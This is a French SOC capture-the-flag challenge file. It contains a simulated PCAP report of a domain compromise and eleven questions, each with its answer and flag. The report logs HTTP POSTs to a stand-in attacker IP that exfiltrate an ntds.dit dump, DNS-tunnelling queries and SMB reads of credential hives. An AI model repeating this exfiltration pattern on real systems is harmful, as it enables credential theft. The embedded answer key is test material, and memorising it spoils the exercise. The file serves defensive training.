"""
Challenge 14 — Analyse PCAP Avancée
Niveau : 4 (Expert SOC)
Catégorie : Forensics Réseau
"""

ARTIFACT_PCAP = r"""
========== ANALYSE PCAP — Capture réseau WKS-COMPTA-PC03 ==========
Fichier : capture_20260218_0800-1400.pcap (2.4 GB)
Période : 18/02/2026 08:00 — 14:00 UTC
Interface : eth0 (10.0.3.45)
Outil : Wireshark 4.2 + tshark + NetworkMiner

===== STATISTIQUES GÉNÉRALES =====
Total paquets     : 4,847,231
Protocoles        : TCP (78%), UDP (18%), ICMP (2%), Other (2%)
Conversations TCP : 1,247
Conversations UDP : 892
Bytes transférés  : 3.8 GB
Durée capture     : 6h00m00s

===== CONVERSATIONS TCP (triées par volume descendant) =====
#    IP Source        Port Src  IP Destination      Port Dst  Packets   Bytes      Duration
1    10.0.3.45       49832     10.0.1.10           445       184,231   892 MB     5h42m
2    10.0.3.45       52100     10.0.1.50           22        72,119    234 MB     5h58m
3    10.0.3.45       51234     185.234.72.19       443       45,678    156 MB     5h41m
4    10.0.3.45       51890     185.234.72.19       8443      23,456    89 MB      4h12m
5    10.0.3.45       52340     91.234.56.78        80        12,890    45 MB      0h32m
6    10.0.3.45       55100     10.0.2.20           3389      9,234     34 MB      0h45m
7    10.0.3.45       53200     10.0.1.10           389       4,567     18 MB      5h50m
8    10.0.3.45       53400     10.0.1.10           88        2,345     8.2 MB     5h48m
9    10.0.3.45       54100     20.190.159.2        443       1,890     4.8 MB     2h15m
10   10.0.3.45       54567     13.107.42.14        443       1,456     4.2 MB     1h30m
11   10.0.3.45       54890     40.126.32.140       443       1,234     3.8 MB     1h10m
12   10.0.3.45       55200     10.0.1.30           443       1,100     3.2 MB     4h20m
13   10.0.3.45       55300     10.0.1.40           8080      890       2.8 MB     3h15m
14   10.0.3.45       55500     10.0.3.1            443       780       2.4 MB     5h55m
15   10.0.3.45       55600     10.0.1.10           135       670       2.1 MB     5h30m
16   10.0.3.45       55700     c2-update-service.xyz 443     560       2.1 MB     3h42m
17   10.0.3.45       56100     104.18.32.47        443       450       1.8 MB     0h45m
18   10.0.3.45       56200     151.101.1.69        443       380       1.2 MB     0h30m
19   10.0.3.45       56300     10.0.3.50           445       320       980 KB     0h15m
20   10.0.3.45       56400     10.0.3.51           445       290       870 KB     0h12m

===== TOP 50 DESTINATIONS (par volume descendant) =====
#   IP Destination      Port  Proto  Bytes      Pays        ASN          Organisation            Verdict
1   10.0.1.10           445   TCP    892 MB     Interne     -            SRV-DC-01 (DC)          Normal
2   10.0.1.50           22    TCP    234 MB     Interne     -            SRV-DEPLOY-01           Normal
3   185.234.72.19       443   TCP    156 MB     RU          AS48693      FlyHosting LLC          ⚠ SUSPECT
4   185.234.72.19       8443  TCP    89 MB      RU          AS48693      FlyHosting LLC          ⚠ SUSPECT
5   91.234.56.78        80    TCP    45 MB      UA          AS15497      Dnepr-Telecom           ⚠ SUSPECT
6   10.0.2.20           3389  TCP    34 MB      Interne     -            SRV-FILE-01             Normal
7   10.0.1.10           389   TCP    18 MB      Interne     -            SRV-DC-01 (LDAP)        Normal
8   8.8.8.8             53    UDP    12 MB      US          AS15169      Google DNS               Normal
9   10.0.1.1            53    UDP    8.7 MB     Interne     -            DNS Interne             Normal
10  20.190.159.2        443   TCP    4.8 MB     US          AS8075       Microsoft Azure AD      Normal
11  13.107.42.14        443   TCP    4.2 MB     US          AS8075       Microsoft Office 365    Normal
12  update.microsoft.com 443  TCP    4.2 MB     US          AS8075       Microsoft Update        Normal
13  40.126.32.140       443   TCP    3.8 MB     US          AS8075       Microsoft Login          Normal
14  10.0.1.30           443   TCP    3.2 MB     Interne     -            SRV-INTRANET-01         Normal
15  10.0.1.40           8080  TCP    2.8 MB     Interne     -            SRV-APP-01 (Jenkins)    Normal
16  10.0.3.1            443   TCP    2.4 MB     Interne     -            Gateway/Proxy            Normal
17  c2-update-service.xyz 443 TCP    2.1 MB     RU          AS48693      (Même ASN que 185.x)    ⚠ SUSPECT
18  10.0.1.10           135   TCP    2.1 MB     Interne     -            SRV-DC-01 (RPC)         Normal
19  104.18.32.47        443   TCP    1.8 MB     US          AS13335      Cloudflare (slack.com)  Normal
20  151.101.1.69        443   TCP    1.2 MB     US          AS54113      Fastly (reddit.com)     Normal
21  10.0.3.50           445   TCP    980 KB     Interne     -            WKS-RH-PC01             Normal
22  10.0.3.51           445   TCP    870 KB     Interne     -            WKS-DEV-PC02            Normal
23  10.0.1.10           88    TCP    8.2 MB     Interne     -            SRV-DC-01 (Kerberos)    Normal
24  52.96.87.14         443   TCP    890 KB     US          AS8075       Outlook.office365.com   Normal
25  142.250.74.100      443   TCP    780 KB     US          AS15169      Google (www.google.com) Normal
26  10.0.1.10           636   TCP    670 KB     Interne     -            SRV-DC-01 (LDAPS)       Normal
27  10.0.2.10           25    TCP    450 KB     Interne     -            SRV-MAIL-01 (SMTP)      Normal
28  10.0.1.10           3268  TCP    390 KB     Interne     -            SRV-DC-01 (GC)          Normal
29  172.217.14.99       443   TCP    340 KB     US          AS15169      Google APIs              Normal
30  10.0.3.45           137   UDP    290 KB     Interne     -            NBNS (local)            Normal
31  10.0.3.45           138   UDP    240 KB     Interne     -            NBDG (local)            Normal
32  20.54.36.150        443   TCP    210 KB     US          AS8075       Microsoft Teams         Normal
33  52.113.194.132      443   TCP    180 KB     US          AS8068       Teams media             Normal
34  13.107.5.88         443   TCP    160 KB     US          AS8075       OneDrive sync           Normal
35  168.61.215.74       123   UDP    120 KB     US          AS8075       time.windows.com (NTP)  Normal
36  239.255.255.250     1900  UDP    98 KB      Multicast   -            SSDP/UPnP               Normal
37  224.0.0.252         5355  UDP    87 KB      Multicast   -            LLMNR                    Normal
38  10.0.3.255          137   UDP    76 KB      Broadcast   -            NBNS Broadcast           Normal
39  255.255.255.255     67    UDP    65 KB      Broadcast   -            DHCP                     Normal
40  ff02::1:3           5355  UDP    54 KB      Multicast   -            LLMNR v6                 Normal

===== ANALYSE DNS DÉTAILLÉE =====
Requêtes DNS totales : 34,521

--- Distribution par type de requête ---
A      : 28,904 (83.7%)
AAAA   : 3,210  (9.3%)
TXT    : 1,189  (3.4%)
SRV    : 567    (1.6%)
PTR    : 412    (1.2%)
MX     : 189    (0.5%)
CNAME  : 50     (0.1%)

--- Distribution par code de réponse ---
NOERROR  : 32,187 (93.2%)
NXDOMAIN : 1,847  (5.3%) ← anormalement élevé
SERVFAIL : 298    (0.9%)
REFUSED  : 189    (0.5%)

--- Top 30 domaines requêtés (par fréquence) ---
#   Domaine                                  Requêtes  Type   Réponse
1   _ldap._tcp.dc._msdcs.redpawn.local       4,521     SRV    NOERROR
2   redpawn.local                              3,890     A      NOERROR
3   SRV-DC-01.redpawn.local                   2,456     A      10.0.1.10
4   outlook.office365.com                      1,234     A      52.96.87.14
5   www.google.com                             987       A      142.250.74.100
6   c2-update-service.xyz                      847       TXT    NXDOMAIN ← SUSPECT
7   login.microsoftonline.com                  654       A      NOERROR
8   graph.microsoft.com                        543       A      NOERROR
9   teams.microsoft.com                        456       A      NOERROR
10  wpad.redpawn.local                         412       A      NXDOMAIN
11  data-sync.c2-update-service.xyz            312       TXT    NXDOMAIN ← SUSPECT
12  update.microsoft.com                       298       A      NOERROR
13  time.windows.com                           267       A      NOERROR
14  officeapps.live.com                        234       A      NOERROR
15  fonts.googleapis.com                       198       A      NOERROR
16  cdn.office.net                             187       A      NOERROR
17  settings-win.data.microsoft.com            176       A      NOERROR
18  v10.events.data.microsoft.com              165       A      NOERROR
19  activity.windows.com                       154       A      NOERROR
20  www.bing.com                               143       A      NOERROR
21  self.events.data.microsoft.com             132       A      NOERROR
22  onedrive.live.com                          121       A      NOERROR
23  SRV-FILE-01.redpawn.local                  118       A      10.0.2.20
24  slack.com                                  98        A      NOERROR
25  health-check.phantomcrane.xyz              48        A      91.234.56.78 ← SUSPECT
26  cdn-static.microsft-update.com             23        A      NOERROR ← SUSPECT (typo)
27  reddit.com                                 21        A      NOERROR
28  stackoverflow.com                          18        A      NOERROR
29  github.com                                 15        A      NOERROR
30  docs.google.com                            12        A      NOERROR

--- Requêtes NXDOMAIN suspectes (extrait) ---
Timestamp             Source IP    Type  Query                                                       
08:12:33.100          10.0.3.45    TXT   UkVEUEFXTl9IT1NU.data.c2-update-service.xyz
08:12:33.450          10.0.3.45    TXT   bmFtZT1XS1MtQ09NUF.data.c2-update-service.xyz
08:12:33.890          10.0.3.45    TXT   VEFS1QzAz.data.c2-update-service.xyz
08:12:34.210          10.0.3.45    TXT   dXNlcj1qLm1hcnRpbg.data.c2-update-service.xyz
[... 843 requêtes similaires vers *.data.c2-update-service.xyz ...]
13:45:12.670          10.0.3.45    TXT   RU5EX0RBVEE=.data.c2-update-service.xyz

Note analyste: Les sous-domaines semblent contenir des données encodées en Base64,
fragmentées sur plusieurs requêtes. Pattern classique de DNS tunneling/exfiltration.
L'interval entre requêtes est aléatoire (500ms-2s), suggérant un délai configurable.

===== ANALYSE TLS / CERTIFICATS =====

--- Connexion #1 : 10.0.3.45 → 185.234.72.19:443 (C2 primaire HTTPS) ---
  Client Hello :
    Version     : TLS 1.2
    Cipher Suites : TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ...
    Extensions  : server_name, ec_point_formats, supported_groups, signature_algorithms, ...
    JA3 Hash      : 72a589da586844d7f0818ce684948eea
    JA3 Fullstring: 771,49200-49196-49192-49188-49172-49162-...,0-23-65281-10-11-35-16-5-13-28,29-23-24,0
  Server Hello :
    Version     : TLS 1.2
    Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
    JA3S Hash     : ae4edc6faf64d08308082ad26be60767
    Server Name   : update-service.microsft.com (SNI falsifié)
  Certificate :
    Subject     : CN=update-service.microsft.com
    Issuer      : CN=update-service.microsft.com (SELF-SIGNED ← pas de CA légitime)
    Serial      : 0x4A3F2B1C
    Valid From  : 2026-02-14 00:00:00 UTC
    Valid To    : 2027-02-14 00:00:00 UTC
    SigAlgo     : SHA256withRSA
    Key Size    : 2048 bits
    Fingerprint : SHA256:9f3a2b8c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a
    SANs        : update-service.microsft.com, *.microsft.com

--- Connexion #2 : 10.0.3.45 → 185.234.72.19:8443 (C2 secondaire) ---
  JA3 Hash      : 72a589da586844d7f0818ce684948eea (MÊME JA3 → même binaire client)
  Server Name   : (vide — pas de SNI)
  Certificate   : Même certificat auto-signé que Connexion #1
  Note: Ce port est utilisé pour les commandes tasking, le port 443 pour le beaconing.

--- Connexion #3 : 10.0.3.45 → 91.234.56.78:80 (exfiltration HTTP) ---
  Pas de TLS — HTTP en clair → facilite l'extraction de contenu

--- Connexions TLS légitimes (référence) ---
  10.0.3.45 → 20.190.159.2:443        JA3: a0e9f5d64349fb13191bc781f81f42e1 (Edge browser)
  10.0.3.45 → 13.107.42.14:443        JA3: a0e9f5d64349fb13191bc781f81f42e1 (Edge browser)
  10.0.3.45 → 52.96.87.14:443         JA3: a0e9f5d64349fb13191bc781f81f42e1 (Edge browser)
  10.0.3.45 → 142.250.74.100:443      JA3: a0e9f5d64349fb13191bc781f81f42e1 (Edge browser)
  10.0.3.45 → 40.126.32.140:443       JA3: cd08e31494f9531f560d64c695473da9 (Office365 app)
  → NOTE: Le JA3 72a589da586844d7f0818ce684948eea N'apparaît PAS dans la baseline
    des applications légitimes de l'entreprise. C'est un JA3 personnalisé.

===== ANALYSE DES BEACONS C2 (pattern détaillé) =====

--- Destination : 185.234.72.19:443 ---
  Premier beacon : 08:16:45.123 UTC
  Dernier beacon : 13:58:12.456 UTC
  Nombre total de check-ins : 342
  Interval moyen : 60.2 secondes (σ = 2.1s)
  Jitter %       : 3.5%
  
--- Distribution des tailles de paquets ---
  Check-in (out)   : 92-156 bytes   (mean: 128 bytes)
  Check-in (in)    : 88-96 bytes    (mean: 92 bytes → "no task")
  Tasking (in)     : 2048-65535 bytes (commandes reçues de l'opérateur)
  Data upload (out): 4096-65535 bytes (exfiltration de données)

--- Pattern temporel (extrait 08:16 - 08:30) ---
  08:16:45.123 → OUT 128 bytes, IN  92 bytes  [CHECK-IN]
  08:17:46.234 → OUT 132 bytes, IN  92 bytes  [CHECK-IN]
  08:18:44.567 → OUT 128 bytes, IN  8432 bytes [TASKING REÇU]
  08:18:47.890 → OUT 65535 bytes              [UPLOAD DATA]
  08:18:48.123 → OUT 65535 bytes              [UPLOAD DATA]
  08:19:48.456 → OUT 156 bytes, IN  92 bytes  [CHECK-IN]
  08:20:49.789 → OUT 128 bytes, IN  92 bytes  [CHECK-IN]
  08:21:51.012 → OUT 132 bytes, IN  92 bytes  [CHECK-IN]
  08:22:50.345 → OUT 128 bytes, IN  4096 bytes [TASKING REÇU]
  08:22:51.678 → OUT 32768 bytes              [UPLOAD DATA]
  08:23:52.901 → OUT 128 bytes, IN  92 bytes  [CHECK-IN]
  08:24:53.234 → OUT 128 bytes, IN  92 bytes  [CHECK-IN]
  08:25:55.567 → OUT 132 bytes, IN  92 bytes  [CHECK-IN]
  08:26:54.890 → OUT 128 bytes, IN  92 bytes  [CHECK-IN]
  08:27:56.123 → OUT 132 bytes, IN  92 bytes  [CHECK-IN]
  08:28:55.456 → OUT 128 bytes, IN  92 bytes  [CHECK-IN]
  08:29:57.789 → OUT 128 bytes, IN  16384 bytes [TASKING REÇU]
  08:29:58.234 → OUT 65535 bytes              [UPLOAD DATA]
  [...]

--- Corrélation temporelle des tasking importants ---
  09:30:12 → Tasking : 12288 bytes reçus → début scan SMB (corrélé avec netscan)
  10:15:44 → Tasking : 8192 bytes reçus → commande d'accès DC
  11:30:00 → Tasking : 4096 bytes reçus → commande RDP
  12:45:33 → Tasking : 16384 bytes reçus → ordre d'exfiltration HTTP
  13:15:00 → Tasking : 2048 bytes reçus → commande finale

--- User-Agent (tous les beacons) ---
  Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

--- Destination : 185.234.72.19:8443 ---
  Premiers paquets : 09:30:15
  Derniers paquets : 13:45:00
  Cette connexion est épisodique (pas de beaconing régulier)
  Utilisée lors des phases de tasking actif uniquement

===== HTTP EN CLAIR (91.234.56.78:80) — Détail complet =====

--- Requête #1 (12:45:33 UTC) ---
GET /update.php?id=RPWN-WKS03&ts=1708258800&v=2.1&os=win10&arch=x64 HTTP/1.1
Host: 91.234.56.78
User-Agent: WinHTTP/6.1
Accept: */*
Connection: keep-alive
X-Session-ID: a7f3b2c1-9d4e-5f6a-8b7c-0d1e2f3a4b5c

HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 18 Feb 2026 12:45:34 GMT
Content-Type: application/octet-stream
Content-Length: 458752
Connection: keep-alive
X-Command: EXFIL_START
X-Chunk-Size: 65536
X-Total-Chunks: 3

[458752 bytes de payload binaire — PE executable]
SHA256: e7b4c3d2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4
Note: PE32+ executable x86-64, sections .text .rdata .data .reloc, imports ws2_32.dll

--- Requête #2 (12:50:12 UTC) ---
POST /gate.php HTTP/1.1
Host: 91.234.56.78
Content-Type: application/octet-stream
Content-Length: 8388608
X-Session: RPWN-WKS03-20260218
X-Part: 1/2
X-Filename: ntds_dump.7z.001

HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Length: 2
X-Status: OK

[8388608 bytes — première partie archive chiffrée]

--- Requête #3 (13:02:45 UTC) ---
POST /gate.php HTTP/1.1
Host: 91.234.56.78
Content-Type: application/octet-stream
Content-Length: 7340032
X-Session: RPWN-WKS03-20260218
X-Part: 2/2
X-Filename: ntds_dump.7z.002

HTTP/1.1 200 OK
Server: nginx/1.18.0
Content-Length: 2
X-Status: OK

[7340032 bytes — deuxième partie, total ~15 MB]

--- Requête #4 (13:15:00 UTC) ---
POST /gate.php HTTP/1.1
Host: 91.234.56.78
Content-Type: multipart/form-data; boundary=--RPWN-BOUNDARY-2026
Content-Length: 245760
X-Session: RPWN-WKS03-20260218
X-Type: ad_export

HTTP/1.1 200 OK
Server: nginx/1.18.0

[245760 bytes — export CSV de l'annuaire Active Directory]

--- Requête #5 (13:30:22 UTC) ---
GET /heartbeat.php?id=RPWN-WKS03&status=complete HTTP/1.1
Host: 91.234.56.78

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 7

SUCCESS

===== ANALYSE SMB DÉTAILLÉE (trafic interne) =====

--- 10.0.3.45 → 10.0.1.10 (SRV-DC-01) Port 445 ---
  Authentification : NTLMSSP (NTLMv2)
    Domain    : REDPAWN
    User      : svc-backup
    Workstation: WKS-COMPTA-PC03

  Séquence d'opérations SMB2 (chronologique) :
    10:15:44.123  SMB2 SESSION_SETUP  - Auth: REDPAWN\svc-backup → Success
    10:15:44.456  SMB2 TREE_CONNECT   - \\SRV-DC-01\ADMIN$
    10:15:44.789  SMB2 TREE_CONNECT   - \\SRV-DC-01\C$
    10:15:45.012  SMB2 TREE_CONNECT   - \\SRV-DC-01\IPC$
    10:15:45.345  SMB2 TREE_CONNECT   - \\SRV-DC-01\SYSVOL
    10:15:45.678  SMB2 TREE_CONNECT   - \\SRV-DC-01\NETLOGON
    10:16:02.123  SMB2 CREATE (WRITE) - \\SRV-DC-01\C$\Windows\Temp\health_check.exe
                  File Size: 458752 bytes
                  Created: 2026-02-18 10:16:02
    10:16:15.456  SMB2 CREATE (READ)  - \\SRV-DC-01\C$\Windows\System32\config\SAM
                  File Size: 262144 bytes
    10:16:20.789  SMB2 CREATE (READ)  - \\SRV-DC-01\C$\Windows\System32\config\SECURITY
                  File Size: 131072 bytes
    10:16:25.012  SMB2 CREATE (READ)  - \\SRV-DC-01\C$\Windows\System32\config\SYSTEM
                  File Size: 15728640 bytes
    10:45:00.345  SMB2 CREATE (READ)  - \\SRV-DC-01\C$\Windows\NTDS\ntds.dit
                  File Size: 52428800 bytes (50 MB)
    10:50:12.678  SMB2 CREATE (READ)  - \\SRV-DC-01\C$\Temp\ntds_dump\Active Directory\ntds.dit
                  Note: dump IFM réalisé par ntdsutil.exe
    11:00:00.012  SMB2 TREE_DISCONNECT - \\SRV-DC-01\C$
    11:00:00.345  SMB2 LOGOFF

  Trafic SMB légitime observé (référence) :
    08:00-09:30   \\SRV-DC-01\SYSVOL\redpawn.local\*.* — GPO refresh (normal)
    08:15:xx      \\SRV-DC-01\NETLOGON\*.bat — logon scripts (normal)
    09:00:xx      \\SRV-DC-01\ADMIN$ — System Center agent check (normal, svc-sccm)

--- 10.0.3.45 → 10.0.2.20 (SRV-FILE-01) Port 3389 ---
  RDP Handshake :
    11:30:00.123  TCP SYN → 10.0.2.20:3389
    11:30:00.234  TCP SYN-ACK
    11:30:00.345  X.224 Connection Request
    11:30:00.456  X.224 Connection Confirm
    Client Info:
      Username: REDPAWN\svc-backup
      Hostname: WKS-COMPTA-PC03
    RDP Session Duration: 45 minutes (11:30 → 12:15)
    Clipboard Data: 2.3 MB transféré (probable copie de fichiers)
    Keyboard Activity: Détectée (commandes tapées)

  RDP légitime observé (référence) :
    08:30:xx  10.0.1.50 → 10.0.2.20:3389 (SRV-DEPLOY → SRV-FILE, utilisateur admin.it) — normal
    09:15:xx  10.0.3.48 → 10.0.2.20:3389 (WKS-IT-PC05 → SRV-FILE, utilisateur helpdesk) — normal

--- Trafic SMB interne normal (bruit de fond) ---
  10.0.3.45 → 10.0.3.50:445   \\WKS-RH-PC01\SharedDocs  (j.martin, normal)
  10.0.3.45 → 10.0.3.51:445   \\WKS-DEV-PC02\Projects   (j.martin, normal)
  10.0.3.48 → 10.0.1.10:445   \\SRV-DC-01\SYSVOL         (helpdesk, normal)
  10.0.1.50 → 10.0.2.20:445   \\SRV-FILE-01\Deploy       (deploy, normal)
  10.0.3.46 → 10.0.1.10:445   \\SRV-DC-01\NETLOGON       (m.dupont, normal)
  10.0.3.47 → 10.0.2.20:445   \\SRV-FILE-01\Finance      (a.bernard, normal)

===== ANALYSE ICMP =====
  10.0.3.45 → 10.0.1.0/24     65 requêtes ICMP Echo (09:30:12 → 09:30:45)
    Séquence: .1, .2, .3, .4, .5, .10, .20, .30, .40, .50, .51, ...
    → Scan de découverte réseau
  10.0.3.45 → 10.0.2.0/24     23 requêtes ICMP Echo (09:31:00 → 09:31:15)
    → Extension du scan au sous-réseau serveurs
  Trafic ICMP normal:
    10.0.3.1 → 10.0.3.45      Périodique (gateway health check)
    10.0.1.10 → 10.0.1.50     Périodique (DC → Deploy)

===== EXTRACTION FICHIERS (NetworkMiner + binwalk) =====
Fichiers extraits du trafic réseau :
#   Filename             SHA256 (8 premiers)  Size       Source          Type
1   health_check.exe     a1b2c3d4...f0e9      458 KB     HTTP GET       PE32+ x86-64, UPX packed
2   stager.ps1           c3d4e5f6...b2a1      2.8 KB     HTTPS (déchiffré via clé privée)  PowerShell
3   data_export.7z       e5f6a7b8...d4c3      15 MB      gate.php POST  Archive 7zip chiffrée
4   mimikatz_output.txt  f7a8b9c0...e6d5      48 KB      HTTPS (déchiffré) Texte — credentials
5   ad_export.csv        b2c3d4e5...a1f0      240 KB     gate.php POST  CSV — annuaire AD
6   sam_dump.bin         d4e5f6a7...c3b2      256 KB     SMB ADMIN$     SAM database copy

===== INDICATEURS TEMPORELS CLÉS (résumé chronologique) =====
08:00:00 — Début de capture
08:05:xx — Trafic normal (GPO, LDAP, Kerberos, Office365, Teams)
08:12:33 — Premier DNS vers c2-update-service.xyz ← PREMIER IOC
08:16:45 — Premier beacon HTTPS vers 185.234.72.19:443
08:17:46 — Beaconing régulier établi (intervalle ~60s)
09:00:xx — Trafic normal (navigation web, email, Teams)
09:30:12 — Scan ICMP interne 10.0.1.0/24 puis 10.0.2.0/24
09:30:15 — Ouverture port 8443 vers 185.234.72.19
10:15:44 — Accès SMB au DC (ADMIN$, C$) via svc-backup
10:16:02 — Upload health_check.exe vers \\SRV-DC-01\C$\Windows\Temp\
10:16:15 — Lecture SAM, SECURITY, SYSTEM via SMB
10:45:00 — Lecture ntds.dit via SMB
11:30:00 — Connexion RDP vers 10.0.2.20 (SRV-FILE-01)  
12:15:00 — Fin session RDP
12:45:33 — Début exfiltration HTTP vers 91.234.56.78
13:02:45 — Upload partie 2/2 de ntds_dump
13:15:00 — Upload export AD via gate.php
13:30:22 — Heartbeat final "SUCCESS"
13:58:12 — Dernier beacon C2 observé
14:00:00 — Fin de capture
"""

CHALLENGE = {
    "id": "c14_pcap_analysis",
    "title": "🔍 L'Écoute Silencieuse",
    "category": "network",
    "level": 4,
    "points_total": 530,
    "estimated_time": "45-60 min",
    "story": """
## Briefing de Mission

**Date :** 18 février 2026, 15h30
**Priorité :** CRITIQUE
**Source :** Équipe Network Forensics

---

Une capture réseau complète a été réalisée sur le poste compromis **WKS-COMPTA-PC03** pendant l'incident. L'analyse révèle du trafic C2, de l'exfiltration de données et du mouvement latéral.

> *"On a une PCAP de 6 heures sur le poste de la comptable. Il y a du C2 chiffré, de l'exfil en clair, et du mouvement latéral par SMB. Analyse tout ça et reconstitue le schéma de communication de l'attaquant."*

Forensique réseau avancée. Montrez votre maîtrise de l'analyse PCAP.
    """,
    "artifacts": [
        {
            "name": "pcap_analysis_report.txt",
            "type": "report",
            "content": ARTIFACT_PCAP,
            "description": "Rapport d'analyse PCAP — Capture réseau WKS-COMPTA-PC03"
        }
    ],
    "questions": [
        {
            "id": "q1",
            "text": "Quel est le JA3 hash du client C2 ? (empreinte TLS du malware)",
            "answer": "72a589da586844d7f0818ce684948eea",
            "flag": "REDPAWN{72a589da586844d7f0818ce684948eea}",
            "points": 50,
            "hints": [
                "Comparez les JA3 hash des connexions TLS suspectes avec les connexions légitimes",
                "Le JA3 identique sur plusieurs connexions suspectes n'appartient pas à la baseline"
            ],
            "hint_cost": 17
        },
        {
            "id": "q2",
            "text": "Quel est l'intervalle moyen des beacons C2 en secondes (arrondi) ?",
            "answer": "60",
            "flag": "REDPAWN{60}",
            "points": 40,
            "hints": [
                "Analysez le pattern temporel dans la section beacon",
                "Calculez la différence moyenne entre chaque check-in consécutif"
            ],
            "hint_cost": 13
        },
        {
            "id": "q3",
            "text": "Quel domaine suspect utilise un typosquatting de Microsoft dans les requêtes DNS ?",
            "answer": "cdn-static.microsft-update.com",
            "flag": "REDPAWN{cdn-static.microsft-update.com}",
            "points": 50,
            "hints": [
                "Parcourez le Top 30 des domaines DNS requêtés",
                "Un domaine ressemble à Microsoft mais avec une lettre manquante"
            ],
            "hint_cost": 17
        },
        {
            "id": "q4",
            "text": "Quel est le volume approximatif total de données exfiltrées via gate.php (en MB) ?",
            "answer": "15",
            "flag": "REDPAWN{15}",
            "points": 40,
            "hints": [
                "Additionnez les Content-Length de toutes les requêtes POST vers gate.php",
                "Il y a plusieurs requêtes POST avec des parties numérotées"
            ],
            "hint_cost": 13
        },
        {
            "id": "q5",
            "text": "Le certificat TLS du C2 est auto-signé. Quel CN (Common Name) usurpe-t-il ?",
            "answer": "update-service.microsft.com",
            "flag": "REDPAWN{update-service.microsft.com}",
            "points": 50,
            "hints": [
                "Analysez les détails du certificat dans la section TLS",
                "Notez l'orthographe exacte — elle imite un domaine Microsoft"
            ],
            "hint_cost": 17
        },
        {
            "id": "q6",
            "text": "Combien de fichiers ont été extraits du trafic par NetworkMiner et binwalk ?",
            "answer": "6",
            "flag": "REDPAWN{6}",
            "points": 30,
            "hints": [
                "Comptez dans la section Extraction Fichiers",
                "Attention, il y a plus de fichiers qu'il n'y paraît au premier coup d'oeil"
            ],
            "hint_cost": 10
        },
        {
            "id": "q7",
            "text": "Par quel outil l'exécutable health_check.exe est-il packé ?",
            "answer": "UPX",
            "flag": "REDPAWN{UPX}",
            "points": 50,
            "hints": [
                "Regardez la description du fichier dans les extractions",
                "C'est un packer open-source très courant pour réduire la taille des exécutables"
            ],
            "hint_cost": 17
        },
        {
            "id": "q8",
            "text": "Quels partages SMB administratifs ont été accédés sur le DC ? (séparés par une virgule, dans l'ordre)",
            "answer": "ADMIN$,C$",
            "flag": "REDPAWN{ADMIN$,C$}",
            "points": 40,
            "hints": [
                "Regardez les TREE_CONNECT SMB2 vers le DC",
                "Filtrez les partages administratifs ($ à la fin) — excluez IPC$, SYSVOL, NETLOGON"
            ],
            "hint_cost": 13
        },
        {
            "id": "q9",
            "text": "Quel paramètre HTTP identifie la machine compromise dans les requêtes vers le serveur d'exfiltration ?",
            "answer": "RPWN-WKS03",
            "flag": "REDPAWN{RPWN-WKS03}",
            "points": 40,
            "hints": [
                "Regardez les paramètres GET de la première requête HTTP",
                "C'est un identifiant de session pour le serveur C2"
            ],
            "hint_cost": 13
        },
        {
            "id": "q10",
            "text": "Quel pourcentage de jitter est appliqué aux beacons C2 ?",
            "answer": "3.5",
            "flag": "REDPAWN{3.5}",
            "points": 40,
            "hints": [
                "Le jitter est indiqué dans les statistiques de la section beacon"
            ],
            "hint_cost": 13
        },
        {
            "id": "q11",
            "text": "Quels fichiers sensibles du DC ont été lus via SMB par l'attaquant ? (listez les noms de fichiers sans chemin, séparés par une virgule, ordre chronologique)",
            "answer": "SAM,SECURITY,SYSTEM,ntds.dit",
            "flag": "REDPAWN{SAM,SECURITY,SYSTEM,ntds.dit}",
            "points": 60,
            "hints": [
                "Regardez les opérations SMB2 CREATE avec accès READ sur le DC",
                "Ce sont des fichiers critiques pour l'extraction de credentials Windows"
            ],
            "hint_cost": 20
        }
    ]
}
